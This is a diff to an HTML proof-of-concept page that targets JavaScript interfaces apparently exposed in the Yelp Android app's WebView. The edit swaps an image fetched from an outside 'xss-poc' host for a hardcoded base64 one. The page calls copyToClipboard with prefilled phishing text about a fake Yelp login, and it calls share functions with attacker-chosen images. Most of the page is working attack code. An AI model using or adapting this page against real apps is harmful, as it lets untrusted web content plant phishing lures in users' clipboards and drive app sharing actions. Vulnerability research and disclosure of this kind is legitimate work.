@@ -3,110 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yelp WebView JS Interface PoC (Remote Image)</title>
+    <title>Yelp WebView JS Interface PoC (Hardcoded Image)</title>
     <style>
         body { font-family: sans-serif; margin: 20px; background-color: #f4f4f4; color: #333; }
         .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        h1, h2 { color: #c41200; } button { background-color: #0073bb; color: white; padding: 10px 15px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px; margin-bottom: 10px; display: block; width: 100%; box-sizing: border-box; }
+        h1, h2 { color: #c41200; /* Yelp Red */ }
+        button {
+            background-color: #0073bb; /* Yelp Blue */
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            display: block;
+            width: 100%;
+            box-sizing: border-box;
+        }
         button:hover { background-color: #005ea6; }
         textarea { width: 100%; box-sizing: border-box; margin-bottom:10px; padding: 8px; border-radius: 4px; border: 1px solid #ccc;}
         .info { background-color: #e7f3fe; border-left: 6px solid #2196F3; padding: 10px; margin-bottom: 15px;}
-        img#preview { max-width: 200px; max-height:200px; border:1px solid #ccc; margin-top:10px; display: block;}
-        .status { margin-top: 10px; font-style: italic; }
+        img#preview { max-width: 100px; max-height:100px; border:1px solid #ccc; margin-top:10px; display: block; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Yelp WebView JavaScript Interface PoC (Remote Image)</h1>
-        <p>This page will fetch an image from a URL, convert it to base64, and then use the exposed JavaScript interfaces.</p>
+        <h1>Yelp WebView JavaScript Interface PoC</h1>
+        <p>This page attempts to interact with exposed JavaScript interfaces in the Yelp Android app using a hardcoded image.</p>
 
         <div class="info">
-            The image will be fetched from: <code id="imageUrlDisplay"></code>
+            The image below is hardcoded via base64.
         </div>
-        <img id="preview" alt="Image preview will load here" />
-        <div id="statusMessage" class="status"></div>
+
+        <img id="preview" alt="Image preview" />
+
+        <script>
+            // Hardcoded base64 string for the PNG image you provided
+            const hardcodedImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAApgAAAKYB3X3/OAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAANCSURBVEiJtZZPbBtFFMZ/M7ubXdtdb1xSFyeilBapySVU8h8OoFaooFSqiihIVIpQBKci6KEg9Q6H9kovIHoCIVQJJCKE1ENFjnAgcaSGC6rEnxBwA04Tx43t2FnvDAfjkNibxgHxnWb2e/u992bee7tCa00YFsffekFY+nUzFtjW0LrvjRXrCDIAaPLlW0nHL0SsZtVoaF98mLrx3pdhOqLtYPHChahZcYYO7KvPFxvRl5XPp1sN3adWiD1ZAqD6XYK1b/dvE5IWryTt2udLFedwc1+9kLp+vbbpoDh+6TklxBeAi9TL0taeWpdmZzQDry0AcO+jQ12RyohqqoYoo8RDwJrU+qXkjWtfi8Xxt58BdQuwQs9qC/afLwCw8tnQbqYAPsgxE1S6F3EAIXux2oQFKm0ihMsOF71dHYx+f3NND68ghCu1YIoePPQN1pGRABkJ6Bus96CutRZMydTl+TvuiRW1m3n0eDl0vRPcEysqdXn+jsQPsrHMquGeXEaY4Yk4wxWcY5V/9scqOMOVUFthatyTy8QyqwZ+kDURKoMWxNKr2EeqVKcTNOajqKoBgOE28U4tdQl5p5bwCw7BWquaZSzAPlwjlithJtp3pTImSqQRrb2Z8PHGigD4RZuNX6JYj6wj7O4TFLbCO/Mn/m8R+h6rYSUb3ekokRY6f/YukArN979jcW+V/S8g0eT/N3VN3kTqWbQ428m9/8k0P/1aIhF36PccEl6EhOcAUCrXKZXXWS3XKd2vc/TRBG9O5ELC17MmWubD2nKhUKZa26Ba2+D3P+4/MNCFwg59oWVeYhkzgN/JDR8deKBoD7Y+ljEjGZ0sosXVTvbc6RHirr2reNy1OXd6pJsQ+gqjk8VWFYmHrwBzW/n+uMPFiRwHB2I7ih8ciHFxIkd/3Omk5tCDV1t+2nNu5sxxpDFNx+huNhVT3/zMDz8usXC3ddaHBj1GHj/As08fwTS7Kt1HBTmyN29vdwAw+/wbwLVOJ3uAD1wi/dUH7Qei66PfyuRj4Ik9is+hglfbkbfR3cnZm7chlUWLdwmprtCohX4HUtlOcQjLYCu+fzGJH2QRKvP3UNz8bWk1qMxjGTOMThZ3kvgLI5AzFfo379UAAAAASUVORK5CYII=";
+
+            document.addEventListener('DOMContentLoaded', function() {
+                const imgElement = document.getElementById('preview');
+                // For HTML preview, we need the data URI prefix. The native methods want raw base64.
+                imgElement.src = "data:image/png;base64," + hardcodedImageBase64;
+            });
+        </script>
 
         <h2>1. Test `copyToClipboard`</h2>
         <label for="clipboardText">Text to copy:</label>
         <textarea id="clipboardText">Malicious URL: https://example-phishing-site.com/yelp-login --- Your Yelp account needs verification!</textarea>
         <button onclick="testCopyToClipboard()">Copy to Clipboard</button>
 
-        <h2>2. Test `openBottomSharingScreen` (with remote cat image)</h2>
-        <button onclick="processImageAndShare('openBottomSharingScreen')">Share Cat Image (System Share)</button>
+        <h2>2. Test `openBottomSharingScreen`</h2>
+        <p>This will attempt to open the Android Share Sheet with the hardcoded image.</p>
+        <button onclick="testOpenBottomSharingScreen()">Share Image (System Share)</button>
 
-        <h2>3. Test `yoyShareToInstagram` (with remote cat image)</h2>
-        <button onclick="processImageAndShare('yoyShareToInstagram')">Share Cat Image to Instagram Stories</button>
+        <h2>3. Test `yoyShareToInstagram`</h2>
+        <p>This will attempt to share the hardcoded image directly to Instagram Stories.</p>
+        <button onclick="testYoyShareToInstagram()">Share Image to Instagram Stories</button>
     </div>
 
     <script>
-        const imageUrl = "http://gelo.gg/xss-poc/funny-cat.jpg"; // Your image URL
-        document.getElementById('imageUrlDisplay').textContent = imageUrl;
-        document.getElementById('preview').src = imageUrl; // Show a preview directly
-
-        let imageBase64Data = null; // To store the fetched base64 data
-
-        function fetchAndConvertImageToBase64(url) {
-            const statusEl = document.getElementById('statusMessage');
-            statusEl.textContent = "Fetching image...";
-            return fetch(url)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok: ' + response.statusText);
-                    }
-                    statusEl.textContent = "Image fetched, converting to blob...";
-                    return response.blob();
-                })
-                .then(blob => {
-                    statusEl.textContent = "Blob created, converting to base64...";
-                    return new Promise((resolve, reject) => {
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            // result includes "data:image/jpeg;base64," prefix, remove it
-                            const base64WithPrefix = reader.result;
-                            const pureBase64 = base64WithPrefix.split(',')[1];
-                            statusEl.textContent = "Base64 conversion complete!";
-                            resolve(pureBase64);
-                        };
-                        reader.onerror = reject;
-                        reader.readAsDataURL(blob);
-                    });
-                })
-                .catch(error => {
-                    statusEl.textContent = 'Error fetching or converting image: ' + error;
-                    console.error('Error fetching or converting image:', error);
-                    alert('Error fetching or converting image: ' + error);
-                    return null;
-                });
-        }
-
-        async function processImageAndShare(interfaceMethodName) {
-            const statusEl = document.getElementById('statusMessage');
-            if (!imageBase64Data) {
-                statusEl.textContent = "Image base64 data not yet fetched. Fetching now...";
-                imageBase64Data = await fetchAndConvertImageToBase64(imageUrl);
-            }
-
-            if (!imageBase64Data) {
-                alert('Could not get base64 data for the image. Sharing aborted.');
-                statusEl.textContent = "Failed to get base64 data. Aborted.";
-                return;
-            }
-
-            if (window.Android && typeof window.Android[interfaceMethodName] === 'function') {
-                try {
-                    window.Android[interfaceMethodName](imageBase64Data);
-                    alert('Attempted to call ' + interfaceMethodName + ' with the cat image.');
-                    statusEl.textContent = "Called " + interfaceMethodName;
-                } catch (e) {
-                    alert('Error calling ' + interfaceMethodName + ': ' + e.toString());
-                    statusEl.textContent = 'Error calling ' + interfaceMethodName + ': ' + e.toString();
-                }
-            } else {
-                alert('Android.' + interfaceMethodName + ' interface not found.');
-                statusEl.textContent = 'Android.' + interfaceMethodName + ' interface not found.';
-            }
-        }
-
         function testCopyToClipboard() {
             const textToCopy = document.getElementById('clipboardText').value;
             if (window.Android && typeof window.Android.copyToClipboard === 'function') {
@@ -121,13 +79,41 @@
             }
         }
 
-        // Optional: Pre-fetch the image when the page loads so it's ready faster
-        // document.addEventListener('DOMContentLoaded', async () => {
-        //     imageBase64Data = await fetchAndConvertImageToBase64(imageUrl);
-        //     if(imageBase64Data) {
-        //         document.getElementById('statusMessage').textContent = "Image pre-fetched and converted to base64.";
-        //     }
-        // });
+        function testOpenBottomSharingScreen() {
+            if (!hardcodedImageBase64) {
+                alert('Base64 image data is not set!');
+                return;
+            }
+            if (window.Android && typeof window.Android.openBottomSharingScreen === 'function') {
+                try {
+                    // The Android method expects the raw base64 string
+                    window.Android.openBottomSharingScreen(hardcodedImageBase64);
+                    alert('Attempted to open bottom sharing screen with the hardcoded image.');
+                } catch (e) {
+                    alert('Error calling openBottomSharingScreen: ' + e.toString());
+                }
+            } else {
+                alert('Android.openBottomSharingScreen interface not found.');
+            }
+        }
+
+        function testYoyShareToInstagram() {
+            if (!hardcodedImageBase64) {
+                alert('Base64 image data is not set!');
+                return;
+            }
+            if (window.Android && typeof window.Android.yoyShareToInstagram === 'function') {
+                try {
+                    // The Android method expects the raw base64 string
+                    window.Android.yoyShareToInstagram(hardcodedImageBase64);
+                    alert('Attempted to share hardcoded image to Instagram Stories.');
+                } catch (e) {
+                    alert('Error calling yoyShareToInstagram: ' + e.toString());
+                }
+            } else {
+                alert('Android.yoyShareToInstagram interface not found.');
+            }
+        }
     </script>
 </body>
 </html>
